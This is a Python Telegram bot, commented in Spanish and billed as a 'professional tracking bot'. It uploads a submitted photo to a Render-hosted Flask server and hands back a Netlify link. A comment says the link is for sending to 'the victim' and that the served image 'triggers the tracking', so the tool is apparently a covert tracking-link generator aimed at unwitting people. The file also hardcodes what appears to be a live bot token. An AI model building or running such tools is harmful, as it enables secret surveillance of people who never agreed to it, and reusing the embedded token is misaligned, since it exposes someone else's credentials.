from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os
import requests
import logging

# Configuración
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8681530789:AAFj7QjUkaE1xfjhcrUA7_twTI6-PEQ8czM')
# URL DE TU SERVIDOR EN RENDER
FLASK_SERVER_URL = 'https://imageo-mm44.onrender.com'
# URL de tu sitio en NETLIFY (Sustituye esto por tu URL de Netlify)
NETLIFY_URL = 'https://tu-sitio-de-netlify.netlify.app'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bienvenido al Bot de Rastreo Profesional.\n\n"
        "Instrucciones:\n"
        "1. Usa /compartir para enviar una imagen.\n"
        "2. El bot te devolverá un enlace para que la persona la vea."
    )

async def share_image(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        # Obtener la foto más grande
        photo = await update.message.photo[-1].get_file()
        photo_bytes = await photo.download_as_bytearray()

        # Enviar a Flask en Render
        files = {'file': ('image.jpg', photo_bytes, 'image/jpeg')}
        try:
            response = requests.post(f"{FLASK_SERVER_URL}/upload", files=files)
            if response.status_code == 200:
                img_path = response.json().get('url')
                full_url = f"{FLASK_SERVER_URL}{img_path}"
                # El link que el usuario enviará a la víctima:
                # El 'index.html' en Netlify sirve la imagen la cual dispara el rastro
                final_link = f"{NETLIFY_URL}/" 
                
                await update.message.reply_text(f"Enlace generado con éxito:\n\n{final_link}")
            else:
                await update.message.reply_text("Error al subir la imagen al servidor.")
        except Exception as e:
            logger.error(f"Error: {e}")
            await update.message.reply_text("Ocurrió un error técnico.")
    else:
        await update.message.reply_text("Por favor, envía una imagen.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("compartir", share_image))
    app.add_handler(MessageHandler(filters.PHOTO, share_image))
    
    print("Bot escuchando...")
    app.run_polling()

if __name__ == '__main__':
    main()